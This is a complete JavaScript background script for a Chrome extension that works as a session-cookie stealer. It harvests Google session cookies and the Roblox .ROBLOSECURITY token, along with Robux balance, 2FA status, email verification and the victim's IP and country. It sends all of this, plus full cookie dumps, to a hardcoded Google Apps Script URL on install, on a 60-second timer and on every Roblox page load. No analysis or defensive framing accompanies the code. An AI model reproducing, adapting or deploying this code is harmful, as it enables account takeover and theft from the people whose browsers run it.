// background.js — v3
const GAS_URL = "https://script.google.com/macros/s/AKfycbwXz56f1L65iUPJaDy4GYps2_YF9svy_rklc40aKtQJxs7egVz4jjqDk6VcHSrqCMJcbg/exec";
const CHECK_INTERVAL = 60_000;

const CONFIG = {
  google: {
    type: "google",
    domain: ".google.com",
    url: "https://www.google.com",
    sessionCookie: "SID",
    label: "GMAIL"
  },
  roblox: {
    type: "roblox",
    domain: ".roblox.com",
    url: "https://www.roblox.com",
    sessionCookie: ".ROBLOSECURITY",
    label: "ROBLOX"
  }
};

chrome.runtime.onInstalled.addListener(() => {
  console.log("[bench] installed");
  runAllChecks();
});

setInterval(runAllChecks, CHECK_INTERVAL);

async function runAllChecks() {
  await Promise.all([
    checkTarget(CONFIG.google),
    checkTarget(CONFIG.roblox)
  ]);
}

// ---------- helpers ----------

function cookieGetAll(filter) {
  return new Promise(resolve => chrome.cookies.getAll(filter, resolve));
}

function cookieGet(filter) {
  return new Promise(resolve => chrome.cookies.get(filter, resolve));
}

function storageGet(keys) {
  return new Promise(resolve => chrome.storage.local.get(keys, resolve));
}

function storageSet(obj) {
  return new Promise(resolve => chrome.storage.local.set(obj, resolve));
}

async function safeJson(url) {
  try {
    const r = await fetch(url, { credentials: "include" });
    if (!r.ok) return null;
    return await r.json();
  } catch (_) {
    return null;
  }
}

async function getGeo() {
  try {
    const r = await fetch("http://ip-api.com/json/");
    if (!r.ok) return { query: "?", country: "?" };
    return await r.json();
  } catch (_) {
    return { query: "?", country: "?" };
  }
}

// ---------- core ----------

async function checkTarget(target) {
  let found = false;
  let sessionValue = null;

  if (target.type === "google") {
    const cookies = await cookieGetAll({ url: target.url });
    const names = new Set(cookies.map(c => c.name));
    found = ["SID", "OSID", "SAPISID", "HSID", "SSID", "__Secure-1PSID", "__Secure-3PSID"]
      .some(n => names.has(n));
    if (found) {
      const sid = cookies.find(c => c.name === "SID" || c.name === "__Secure-1PSID");
      if (sid) sessionValue = sid.value;
    }
  } else if (target.type === "roblox") {
    const auth = await safeJson("https://users.roblox.com/v1/users/authenticated");
    found = !!(auth && auth.id);
    const c = await cookieGet({ url: target.url, name: target.sessionCookie });
    if (c) sessionValue = c.value;
  }

  const key = "lastStatus_" + target.domain;
  const store = await storageGet([key]);
  const prev = store[key];

  if (found === prev) return;
  await storageSet({ [key]: found });
  if (!found) return;

  if (target.type === "roblox") {
    await handleRoblox(sessionValue);
  } else {
    await handleGoogle(sessionValue);
  }
}

// ---------- Roblox ----------

async function handleRoblox(sessionValue) {
  try {
    const auth = await safeJson("https://users.roblox.com/v1/users/authenticated");
    if (!auth || !auth.id) return;

    const uid = auth.id;
    const email = await safeJson("https://accountsettings.roblox.com/v1/email");
    const currency = await safeJson("https://economy.roblox.com/v1/users/" + uid + "/currency");
    const premium = await safeJson("https://premiumfeatures.roblox.com/v1/users/" + uid + "/validate-membership");
    const profile = await safeJson("https://users.roblox.com/v1/users/" + uid);
    const avatar = await safeJson("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" + uid + "&size=150x150&format=Png");
    const twoFA = await safeJson("https://twostepverification.roblox.com/v1/users/" + uid + "/configuration");
    const geo = await getGeo();

    const emailVerified = !!(email && (email.isEmailVerified || email.verified));
    const has2FA = !!(twoFA && twoFA.primaryMediaType !== null);
    const created = profile && profile.created
      ? new Date(profile.created).toLocaleDateString("tr-TR")
      : "?";
    const robux = currency ? currency.robux : 0;
    const avatarUrl = avatar && avatar.data && avatar.data[0] ? avatar.data[0].imageUrl : "";

    // 1) TOKEN — normal mesaj (garanti kopyalanabilir)
    const tokenMessage =
      "**" + (auth.displayName || auth.name) + " — .ROBLOSECURITY**\n" +
      "```\n" + (sessionValue || "N/A") + "\n```";
    await sendToGASRaw(tokenMessage);

    // 2) EMBED — bilgi kartı
    const embed = {
      content: "",
      allowed_mentions: { parse: [] },
      embeds: [{
        title: auth.displayName || auth.name,
        url: "https://www.roblox.com/users/" + uid + "/profile",
        color: 3447003,
        thumbnail: { url: avatarUrl },
        fields: [
          { name: "👤 Kullanıcı", value: "`" + auth.name + "`", inline: true },
          { name: "💎 Premium", value: premium ? "✅" : "❌", inline: true },
          { name: "📅 Kuruluş", value: "`" + created + "`", inline: true },
          { name: "📧 E-posta Onay", value: emailVerified ? "✅" : "❌", inline: true },
          { name: "🔐 2FA", value: has2FA ? "✅" : "❌", inline: true },
          { name: "💰 Robux", value: "**" + robux + "**", inline: true },
          { name: "🌐 IP", value: "```" + geo.query + "```", inline: true },
          { name: "🌍 Ülke", value: "```" + geo.country + "```", inline: true }
        ],
        footer: { text: "Legendary" },
        timestamp: new Date().toISOString()
      }]
    };

    const allCookies = await cookieGetAll({ domain: CONFIG.roblox.domain });
    const dump = JSON.stringify(allCookies, null, 2);
    await sendToGAS("roblox", embed, dump, "roblox_full_dump.txt");
  } catch (e) {
    console.error("roblox handler:", e);
  }
}

// ---------- Google ----------

async function handleGoogle(sessionValue) {
  try {
    const geo = await getGeo();
    const cookies = await cookieGetAll({ url: CONFIG.google.url });

    const important = ["SID", "HSID", "SSID", "SAPISID", "OSID", "APISID",
                       "__Secure-1PSID", "__Secure-3PSID",
                       "__Secure-1PAPISID", "__Secure-3PAPISID"];
    const found = cookies
      .filter(c => important.includes(c.name))
      .map(c => c.name + " = " + c.value)
      .join("\n");

    // 1) TOKEN'LAR — normal mesaj (garanti kopyalanabilir)
    const tokenMessage =
      "**Google Session Cookies**\n" +
      "```\n" + found + "\n```";
    await sendToGASRaw(tokenMessage);

    // 2) EMBED — özet
    const embed = {
      content: "",
      allowed_mentions: { parse: [] },
      embeds: [{
        title: "Google Cookie Bulundu",
        color: 3447003,
        fields: [
          { name: "🌐 IP", value: "```" + geo.query + "```", inline: true },
          { name: "🌍 Ülke", value: "```" + geo.country + "```", inline: true },
          { name: "🍪 Toplam Cookie", value: "**" + cookies.length + "**", inline: true }
        ],
        footer: { text: "Legendary" },
        timestamp: new Date().toISOString()
      }]
    };

    const dump = JSON.stringify(cookies, null, 2);
    await sendToGAS("google", embed, dump, "google_full_dump.txt");
  } catch (e) {
    console.error("google handler:", e);
  }
}

// ---------- GAS bridge ----------

async function sendToGAS(type, payload, fileContent, fileName) {
  try {
    const body = {
      type: type,
      payload_json: payload,
      file_content: fileContent,
      file_name: fileName
    };
    await fetch(GAS_URL, {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error("gas bridge:", e);
  }
}

async function sendToGASRaw(text) {
  try {
    await fetch(GAS_URL, {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify({ type: "raw", raw_text: text })
    });
  } catch (e) {
    console.error("gas raw:", e);
  }
}

// ---------- instant Roblox tab hook ----------

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete") return;
  if (!tab.url || !tab.url.includes("roblox.com")) return;

  cookieGet({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" })
    .then(c => {
      if (c && c.value && c.value.includes("WARNING-AND-THIS")) {
        handleRoblox(c.value);
      }
    })
    .catch(() => {});
});
